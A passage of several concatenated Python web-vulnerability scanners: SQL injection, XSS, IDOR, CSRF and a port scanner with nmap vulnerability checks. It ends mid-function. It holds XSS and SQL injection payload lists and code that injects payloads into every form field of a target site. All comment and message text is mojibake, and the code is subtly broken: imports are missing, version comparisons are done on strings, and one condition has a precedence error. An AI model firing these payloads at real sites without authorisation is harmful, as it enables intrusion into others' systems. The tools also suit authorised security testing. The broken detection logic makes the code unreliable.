                    print(f"    [!] –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ SQL-–∏–Ω—ä–µ–∫—Ü–∏—è –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ {param}")
                    return True
                
                # –î–ª—è Time-based SQLi
                if "SLEEP" in payload and response.elapsed.total_seconds() > 3:
                    print(f"    [!] –í–æ–∑–º–æ–∂–Ω–∞ Time-based SQL-–∏–Ω—ä–µ–∫—Ü–∏—è –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ {param}")
                    return True
            except:
                continue
        
        return False

    def test_xss(self, url, param):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –Ω–∞ XSS"""
        test_payload = "<script>alert(1)</script>"
        modified_url = url.replace(f"{param}=", f"{param}={test_payload}")
        
        try:
            response = self.session.get(modified_url, timeout = 5)
            if test_payload in response.text:
                print(f"    [!] –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ XSS-—É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ {param}")
                return True
        except:
            pass
        
        return False

    def test_idor(self, url, param):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ Insecure Direct Object Reference"""
        test_value = "12345"  # –ü–æ–¥–º–µ–Ω–∞ ID
        modified_url = url.replace(f"{param}=", f"{param}={test_value}")
        
        try:
            response = self.session.get(modified_url, timeout = 5)
            if response.status_code == 200 and "error" not in response.text.lower():
                print(f"    [!] –í–æ–∑–º–æ–∂–Ω–∞ IDOR-—É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ {param}")
                return True
        except:
            pass
        
        return False

    def test_info_leak(self, url, param):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —É—Ç–µ—á–∫–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏"""
        sensitive_keywords = ["debug", "token", "secret", "password"]
        
        if any(keyword in param.lower() for keyword in sensitive_keywords):
            print(f"    [!] –ü–∞—Ä–∞–º–µ—Ç—Ä {param} –º–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —É—Ç–µ—á–∫—É –¥–∞–Ω–Ω—ã—Ö")
            return True
        
        return False

    def crawl_and_scan(self, max_pages = 10):
        """–†–µ–∫—É—Ä—Å–∏–≤–Ω—ã–π –æ–±—Ö–æ–¥ –∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ URL"""
        visited = set()
        queue = [self.base_url]
        
        while queue and len(visited) < max_pages:
            current_url = queue.pop(0)
            
            if current_url in visited:
                continue
            
            visited.add(current_url)
            self.scan_url(current_url)
            
            # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏ –≤ –æ—á–µ—Ä–µ–¥—å
            new_links = self.get_links_from_page(current_url)
            queue.extend(new_links - visited)
            
            time.sleep(1)  # –ó–∞—â–∏—Ç–∞ –æ—Ç –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏

    def save_results(self):
        """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤ JSON"""
        with open(self.output_file, "w", encoding = "utf-8") as f:
            json.dump(self.vulnerabilities, f, indent = 4)
        
        print(f"\n[‚úÖ] –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ {self.output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = "–°–∫–∞–Ω–µ—Ä —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π URL")
    parser.add_argument("-u", "--url", required = True, help = "–ë–∞–∑–æ–≤—ã–π URL –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è")
    parser.add_argument("-o", "--output", default = "scan_results.json", help = "–§–∞–π–ª –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤")
    parser.add_argument("-m", "--max-pages", type = int, default = 10, help = "–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å—Ç—Ä–∞–Ω–∏—Ü –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è")
    args = parser.parse_args()
    
    scanner = URLScanner(args.url, args.output)
    scanner.crawl_and_scan(args.max_pages)
    scanner.save_results()

# –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –≤ JSON:
[
    {
        "url": "https://example.com/profile?id=1",
        "parameter": "id",
        "type": "SQL Injection",
        "payload": "' OR '1'='1"
    }
]

# ===========================================================================================================================================

# XSS Scanner: –£—Ç–∏–ª–∏—Ç–∞ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –º–µ–∂—Å–∞–π—Ç–æ–≤–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∏–Ω–≥–∞ (XSS)
# –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏: pip install requests beautifulsoup4
# –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–∫–∞–Ω–µ—Ä: python xss_scanner.py -u https://example.com -o results.json -d 3

import requests
from urllib.parse import urlparse, urljoin, quote
from bs4 import BeautifulSoup
import argparse
import json
import re
import html

class XSSScanner:
    def __init__(self, target_url, output_file = "xss_results.json"):
        self.target_url = target_url
        self.output_file = output_file
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (XSS-Scanner/1.0)",
            "Accept": "text/html,application/xhtml+xml"
        })
        self.vulnerabilities = []
        self.tested_urls = set()
        
        # –ö–æ–ª–ª–µ–∫—Ü–∏—è XSS payload'–æ–≤ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–æ–≤
        self.payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            
            # DOM-based XSS
            "javascript:alert('XSS')",
            "\" onmouseover=\"alert('XSS')",
            "'-alert('XSS')-'",
            
            # Obfuscated XSS
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            
            # Advanced vectors
            "<iframe src=\"javascript:alert('XSS')\">",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed code=\"javascript:alert('XSS')\">"
        ]

    def scan_url(self, url):
        """–°–∫–∞–Ω–∏—Ä—É–µ—Ç URL –Ω–∞ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–∏"""
        if url in self.tested_urls:
            return
        self.tested_urls.add(url)
        
        print(f"[*] –ü—Ä–æ–≤–µ—Ä–∫–∞: {url}")
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç—Ä–∞–∂–µ–Ω–Ω–æ–≥–æ XSS –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö URL
        parsed = urlparse(url)
        if parsed.query:
            self.test_reflected_xss(url)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ö—Ä–∞–Ω–∏–º–æ–≥–æ XSS –≤ —Ñ–æ—Ä–º–∞—Ö
        self.test_stored_xss(url)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ DOM-based XSS
        self.test_dom_xss(url)

    def test_reflected_xss(self, url):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Ç—Ä–∞–∂–µ–Ω–Ω–æ–≥–æ XSS –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            original_value = params[param][0]
            
            for payload in self.payloads:
                # –ü–æ–¥–º–µ–Ω—è–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –Ω–∞ XSS payload
                modified_query = parsed.query.replace(
                    f"{param}={original_value}", 
                    f"{param}={quote(payload)}"
                )
                modified_url = parsed._replace(query = modified_query).geturl()
                
                try:
                    response = self.session.get(modified_url, timeout = 10)
                    
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –±—ã–ª –ª–∏ payload –≤—ã–ø–æ–ª–Ω–µ–Ω
                    if self.is_xss_successful(response, payload):
                        self.report_vulnerability(
                            url = url,
                            param = param,
                            payload = payload,
                            type = "Reflected XSS",
                            context = "URL Parameter"
                        )
                        break
                
                except Exception as e:
                    print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ {param}: {e}")

    def test_stored_xss(self, url):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ö—Ä–∞–Ω–∏–º–æ–≥–æ XSS —á–µ—Ä–µ–∑ —Ñ–æ—Ä–º—ã"""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_details = self.get_form_details(form)
                form_url = urljoin(url, form_details["action"])
                
                # –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö —Ñ–æ—Ä–º—ã —Å XSS payload
                data = {}
                for input_tag in form_details["inputs"]:
                    if input_tag["type"] == "hidden":
                        data[input_tag["name"]] = input_tag["value"]
                    elif input_tag["type"] != "submit":
                        # –í—Å—Ç–∞–≤–ª—è–µ–º payload –≤ –∫–∞–∂–¥–æ–µ –ø–æ–ª–µ
                        data[input_tag["name"]] = self.payloads[0]
                
                # –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã
                if form_details["method"] == "post":
                    response = self.session.post(form_url, data = data)
                else:
                    response = self.session.get(form_url, params = data)
                
                # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Ö—Ä–∞–Ω–∏–º—ã–π XSS
                if self.is_xss_successful(response, self.payloads[0]):
                    self.report_vulnerability(
                        url = url,
                        param = "Form input",
                        payload = self.payloads[0],
                        type = "Stored XSS",
                        context = f"Form at {form_url}"
                    )
        
        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–æ—Ä–º: {e}")

    def test_dom_xss(self, url):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ DOM-based XSS"""
        try:
            response = self.session.get(url)
            
            # –ò—â–µ–º –æ–ø–∞—Å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –≤ JavaScript
            dom_patterns = [
                r"document\.write\(.*\)",
                r"innerHTML\s*=",
                r"eval\(.*\)",
                r"setTimeout\(.*\)",
                r"location\.hash"
            ]
            
            for pattern in dom_patterns:
                if re.search(pattern, response.text):
                    self.report_vulnerability(
                        url = url,
                        param = "DOM Operation",
                        payload = pattern,
                        type = "Potential DOM-based XSS",
                        context = "JavaScript code"
                    )
                    break
        
        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ DOM: {e}")

    def get_form_details(self, form):
        """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –¥–µ—Ç–∞–ª–∏ HTML —Ñ–æ—Ä–º—ã"""
        details = {
            "action": form.attrs.get("action", ""),
            "method": form.attrs.get("method", "get").lower(),
            "inputs": []
        }
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            details["inputs"].append({
                "type": input_type,
                "name": input_name,
                "value": input_value
            })
        
        return details

    def is_xss_successful(self, response, payload):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –±—ã–ª –ª–∏ XSS payload —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω"""
        # –î–µ–∫–æ–¥–∏—Ä—É–µ–º HTML-—Å—É—â–Ω–æ—Å—Ç–∏ –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—è
        decoded_payload = html.unescape(payload)
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–Ω—ã–µ –ø—Ä–∏–∑–Ω–∞–∫–∏ —É—Å–ø–µ—à–Ω–æ–π XSS –∞—Ç–∞–∫–∏
        conditions = [
            decoded_payload in response.text,  # Payload –æ—Å—Ç–∞–ª—Å—è –Ω–µ–∏–∑–º–µ–Ω–Ω—ã–º
            "alert('XSS')" in response.text,   # –ù–∞—à–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ alert
            "<script>" in response.text.lower(),  # –¢–µ–≥–∏ —Å–∫—Ä–∏–ø—Ç–æ–≤ –Ω–µ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω—ã
            "onerror=" in response.text.lower()  # –ê—Ç—Ä–∏–±—É—Ç—ã —Å–æ–±—ã—Ç–∏–π
        ]
        
        return any(conditions)

    def report_vulnerability(self, url, param, payload, type, context):
        """–ó–∞–ø–∏—Å—ã–≤–∞–µ—Ç –Ω–∞–π–¥–µ–Ω–Ω—É—é —É—è–∑–≤–∏–º–æ—Å—Ç—å"""
        vulnerability = {
            "url": url,
            "parameter": param,
            "payload": payload,
            "type": type,
            "context": context,
            "severity": "High"
        }
        
        self.vulnerabilities.append(vulnerability)
        print(f"\n[!] –ù–∞–π–¥–µ–Ω–∞ {type} —É—è–∑–≤–∏–º–æ—Å—Ç—å:")
        print(f"    URL: {url}")
        print(f"    –ü–∞—Ä–∞–º–µ—Ç—Ä: {param}")
        print(f"    –ö–æ–Ω—Ç–µ–∫—Å—Ç: {context}")
        print(f"    Payload: {payload[:50]}...")

    def crawl(self, max_urls = 10):
        """–†–µ–∫—É—Ä—Å–∏–≤–Ω–æ –æ–±—Ö–æ–¥–∏—Ç —Å–∞–π—Ç"""
        urls = set()
        urls.add(self.target_url)
        
        while urls and len(self.tested_urls) < max_urls:
            url = urls.pop()
            
            try:
                response = self.session.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all('a', href = True):
                    absolute_url = urljoin(url, link['href'])
                    if self.target_url in absolute_url and absolute_url not in self.tested_urls:
                        urls.add(absolute_url)
                
                self.scan_url(url)
            
            except Exception as e:
                print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ {url}: {e}")

    def save_results(self):
        """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤ JSON —Ñ–∞–π–ª"""
        with open(self.output_file, 'w') as f:
            json.dump(self.vulnerabilities, f, indent = 4)
        
        print(f"\n[+] –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ {self.output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = "XSS Scanner")
    parser.add_argument("-u", "--url", required = True, help = "–¶–µ–ª–µ–≤–æ–π URL")
    parser.add_argument("-o", "--output", default = "xss_results.json", help = "–§–∞–π–ª –¥–ª—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤")
    parser.add_argument("-d", "--depth", type = int, default = 5, help = "–ì–ª—É–±–∏–Ω–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è")
    args = parser.parse_args()
    
    scanner = XSSScanner(args.url, args.output)
    scanner.crawl(args.depth)
    scanner.save_results()

# =====================================================================================================================================

# CSRF Vulnerability Scanner
# –ë–∞–∑–æ–≤—ã–π —Ç–µ—Å—Ç (–±–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏): python csrf_scanner.py -u https://example.com/form-page
# –¢–µ—Å—Ç —Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π (–µ—Å–ª–∏ –Ω—É–∂–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö —Ñ–æ—Ä–º): 
# python csrf_scanner.py -u https://example.com/account/change-password -c "your_session_cookie_value"
# –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –≤ —É–∫–∞–∑–∞–Ω–Ω—ã–π —Ñ–∞–π–ª: python csrf_scanner.py -u https://example.com -o results.json

import requests
from bs4 import BeautifulSoup
import argparse
import json
import re

class CSRFTester:
    def __init__(self, target_url, session_cookie = None):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
        
        # –®–∞–±–ª–æ–Ω—ã –¥–ª—è –ø–æ–∏—Å–∫–∞ CSRF-—Ç–æ–∫–µ–Ω–æ–≤
        self.csrf_patterns = [
            r'<input[^>]*name=["\']csrf_token["\'][^>]*>',
            r'<meta[^>]*name=["\']csrf-token["\'][^>]*>',
            r'<input[^>]*name=["\']_token["\'][^>]*>',
            r'<input[^>]*name=["\']authenticity_token["\'][^>]*>'
        ]

    def test_csrf_protection(self):
        """–û—Å–Ω–æ–≤–Ω–æ–π –º–µ—Ç–æ–¥ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è CSRF —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π"""
        print(f"[*] –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ CSRF –∑–∞—â–∏—Ç—ã –Ω–∞ {self.target_url}")
        
        # 1. –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ CSRF-—Ç–æ–∫–µ–Ω–æ–≤ –≤ —Ñ–æ—Ä–º–∞—Ö
        forms = self.get_forms()
        if not forms:
            print("[!] –ù–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ —Ñ–æ—Ä–º –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è")
            return
        
        for form in forms:
            form_details = self.analyze_form(form)
            print(f"\n[+] –ù–∞–π–¥–µ–Ω–∞ —Ñ–æ—Ä–º–∞: {form_details['action']}")
            
            # 2. –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ CSRF-—Ç–æ–∫–µ–Ω–∞ –≤ —Ñ–æ—Ä–º–µ
            csrf_token = self.find_csrf_token(form_details)
            
            if csrf_token:
                print(f"[*] –û–±–Ω–∞—Ä—É–∂–µ–Ω CSRF-—Ç–æ–∫–µ–Ω: {csrf_token[:20]}...")
                # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ñ–æ—Ä–º—É —Å –Ω–µ–≤–µ—Ä–Ω—ã–º —Ç–æ–∫–µ–Ω–æ–º
                self.test_invalid_csrf(form_details, csrf_token)
            else:
                print("[!] CSRF-—Ç–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω - –≤–æ–∑–º–æ–∂–Ω–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å")
                # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ñ–æ—Ä–º—É –±–µ–∑ —Ç–æ–∫–µ–Ω–∞
                self.test_no_csrf(form_details)
    
    def get_forms(self):
        """–ü–æ–ª—É—á–∞–µ—Ç –≤—Å–µ —Ñ–æ—Ä–º—ã —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Ñ–æ—Ä–º: {e}")
            return []

    def analyze_form(self, form):
        """–ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç HTML-—Ñ–æ—Ä–º—É –∏ –∏–∑–≤–ª–µ–∫–∞–µ—Ç –¥–µ—Ç–∞–ª–∏"""
        details = {
            'action': form.attrs.get('action', self.target_url),
            'method': form.attrs.get('method', 'get').lower(),
            'inputs': []
        }
        
        for input_tag in form.find_all('input'):
            input_details = {
                'type': input_tag.attrs.get('type', 'text'),
                'name': input_tag.attrs.get('name'),
                'value': input_tag.attrs.get('value', '')
            }
            details['inputs'].append(input_details)
        
        return details

    def find_csrf_token(self, form_details):
        """–ò—â–µ—Ç CSRF-—Ç–æ–∫–µ–Ω –≤ —Ñ–æ—Ä–º–µ"""
        for input_field in form_details['inputs']:
            if input_field['name'] and any(name in input_field['name'].lower() 
               for name in ['csrf', '_token', 'authenticity_token']):
                return input_field['value']
        
        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤ —Ç–µ–ª–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        response = self.session.get(self.target_url)
        for pattern in self.csrf_patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(0)
        
        return None

    def test_no_csrf(self, form_details):
        """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç —Ñ–æ—Ä–º—É –±–µ–∑ CSRF-—Ç–æ–∫–µ–Ω–∞"""
        data = {}
        for input_field in form_details['inputs']:
            if input_field['type'] == 'hidden' and not any(
               name in input_field['name'].lower() 
               for name in ['csrf', '_token']):
                data[input_field['name']] = input_field['value']
            elif input_field['type'] not in ['submit', 'button']:
                data[input_field['name']] = 'test_value'
        
        result = self.submit_form(form_details, data)
        if result and result.status_code in [200, 302]:
            self.vulnerabilities.append({
                'url': self.target_url,
                'form_action': form_details['action'],
                'vulnerability': 'Missing CSRF Protection',
                'severity': 'High'
            })
            print("[!] –£—è–∑–≤–∏–º–æ—Å—Ç—å CSRF –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞: —Ñ–æ—Ä–º–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –∑–∞–ø—Ä–æ—Å—ã –±–µ–∑ —Ç–æ–∫–µ–Ω–∞")

    def test_invalid_csrf(self, form_details, original_token):
        """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç —Ñ–æ—Ä–º—É —Å –Ω–µ–≤–µ—Ä–Ω—ã–º CSRF-—Ç–æ–∫–µ–Ω–æ–º"""
        data = {}
        invalid_token = 'invalid_csrf_token_12345'
        
        for input_field in form_details['inputs']:
            if input_field['type'] == 'hidden' and any(
               name in input_field['name'].lower() 
               for name in ['csrf', '_token']):
                data[input_field['name']] = invalid_token
            elif input_field['type'] not in ['submit', 'button']:
                data[input_field['name']] = input_field['value'] or 'test_value'
        
        result = self.submit_form(form_details, data)
        if result and result.status_code in [200, 302]:
            self.vulnerabilities.append({
                'url': self.target_url,
                'form_action': form_details['action'],
                'vulnerability': 'Weak CSRF Protection',
                'severity': 'Medium'
            })
            print("[!] –í–æ–∑–º–æ–∂–Ω–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å CSRF: —Ñ–æ—Ä–º–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –∑–∞–ø—Ä–æ—Å—ã —Å –Ω–µ–≤–µ—Ä–Ω—ã–º —Ç–æ–∫–µ–Ω–æ–º")

    def submit_form(self, form_details, data):
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–æ—Ä–º—É"""
        url = form_details['action']
        if not url.startswith(('http://', 'https://')):
            url = urljoin(self.target_url, url)
        
        try:
            if form_details['method'] == 'post':
                return self.session.post(url, data = data)
            else:
                return self.session.get(url, params = data)
        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–æ—Ä–º—ã: {e}")
            return None

    def save_results(self, filename='csrf_results.json'):
        """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è"""
        with open(filename, 'w') as f:
            json.dump(self.vulnerabilities, f, indent = 4)
        print(f"\n[+] –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ {filename}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'CSRF Vulnerability Scanner')
    parser.add_argument('-u', '--url', required = True, help = 'Target URL to test')
    parser.add_argument('-c', '--cookie', help = 'Session cookie for authenticated testing')
    parser.add_argument('-o', '--output', default = 'csrf_results.json', help = 'Output file')
    
    args = parser.parse_args()
    
    scanner = CSRFTester(args.url, args.cookie)
    scanner.test_csrf_protection()
    scanner.save_results(args.output)

# ====================================================================================================================================

# Advanced Port Scanner with Vulnerability Detection
# Basic scan: python port_scanner.py 192.168.1.1
# Scan specific ports: python port_scanner.py 192.168.1.1 -p 21,22,80,443
# Custom thread count and output file: python port_scanner.py 192.168.1.1 -t 200 -o scan_results.json

import socket
import concurrent.futures
import nmap
import argparse
import json
from datetime import datetime

class PortScanner:
    def __init__(self, target, ports = None, threads = 100, timeout = 1.0):
        self.target = target
        self.ports = ports if ports else self.get_common_ports()
        self.threads = threads
        self.timeout = timeout
        self.results = []
        self.vulnerabilities = []
        self.nm = nmap.PortScanner()
        
    def get_common_ports(self):
        """Return a list of commonly used ports"""
        return {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            135: 'MS RPC',
            139: 'NetBIOS',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            3389: 'RDP',
            5900: 'VNC',
            8080: 'HTTP Alt'
        }

    def scan_port(self, port):
        """Scan a single port"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                result = s.connect_ex((self.target, port))
                if result == 0:
                    service = self.get_common_ports().get(port, 'Unknown')
                    self.results.append({'port': port, 'status': 'open', 'service': service})
                    return port
        except Exception as e:
            pass
        return None

    def run_scan(self):
        """Run the port scan with multithreading"""
        print(f"[*] Starting scan of {self.target}")
        open_ports = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers = self.threads) as executor:
            future_to_port = {executor.submit(self.scan_port, port): port for port in self.ports}
            for future in concurrent.futures.as_completed(future_to_port):
                port = future_to_port[future]
                try:
                    if future.result():
                        open_ports.append(future.result())
                except Exception as e:
                    pass

        if open_ports:
            print("\n[+] Open ports found:")
            for port in sorted(open_ports):
                service = self.get_common_ports().get(port, 'Unknown')
                print(f"    Port {port}: {service}")
            self.vulnerability_scan(open_ports)
        else:
            print("\n[-] No open ports found")

    def vulnerability_scan(self, open_ports):
        """Perform vulnerability assessment on open ports"""
        print("\n[*] Starting vulnerability assessment...")
        
        # Nmap service/version detection
        port_str = ','.join(map(str, open_ports))
        self.nm.scan(hosts = self.target, ports = port_str, arguments = '-sV --script=banner,vulners')
        
        for host in self.nm.all_hosts():
            for proto in self.nm[host].all_protocols():
                ports = self.nm[host][proto].keys()
                for port in ports:
                    service = self.nm[host][proto][port]
                    
                    # Check for common vulnerabilities
                    vulns = self.check_common_vulns(port, service)
                    
                    if vulns:
                        self.vulnerabilities.append({
                            'port': port,
                            'service': service['name'],
                            'version': service.get('version', 'unknown'),
                            'vulnerabilities': vulns
                        })
        
        if self.vulnerabilities:
            print("\n[!] Potential vulnerabilities found:")
            for vuln in self.vulnerabilities:
                print(f"\n    Port {vuln['port']} ({vuln['service']} {vuln.get('version', '')}):")
                for issue in vuln['vulnerabilities']:
                    print(f"      - {issue}")
        else:
            print("\n[-] No obvious vulnerabilities detected")

    def check_common_vulns(self, port, service):
        """Check for known vulnerabilities based on service/port"""
        vulns = []
        service_name = service['name'].lower()
        product = service.get('product', '').lower()
        version = service.get('version', '')
        
        # FTP checks
        if port == 21:
            if 'anonymous' in service.get('banner', '').lower():
                vulns.append("Anonymous FTP login allowed")
            if not service.get('tls', False):
                vulns.append("FTP without encryption (credentials transmitted in clear text)")
        
        # SSH checks
        if port == 22:
            if 'openssh' in product:
                if version and version.split('.')[0] < '8':
                    vulns.append("Outdated OpenSSH version (potential vulnerabilities)")
            if 'protocol 1' in service.get('banner', '').lower():
                vulns.append("SSH Protocol 1 enabled (insecure)")
        
        # RDP checks
        if port == 3389:
            if not service.get('ssl', False):
                vulns.append("RDP without encryption (credentials transmitted in clear text)")
            if 'nla' not in service.get('banner', '').lower():
                vulns.append("Network Level Authentication not enforced")
        
        # SMB checks
        if port == 445:
            if 'windows' in product:
                if version and '7' in version or '2008' in version:
                    vulns.append("Potential EternalBlue vulnerability (MS17-010)")
            if 'samba' in product and version and version.split('.')[0] < '4':
                vulns.append("Outdated Samba version (potential vulnerabilities)")
        
        # HTTP checks
        if port in [80, 443, 8080]:
            if 'apache' in product and version and version.split('.')[0] < '2':
                vulns.append("Outdated Apache version")
            if 'iis' in product and version and '7.5' in version:
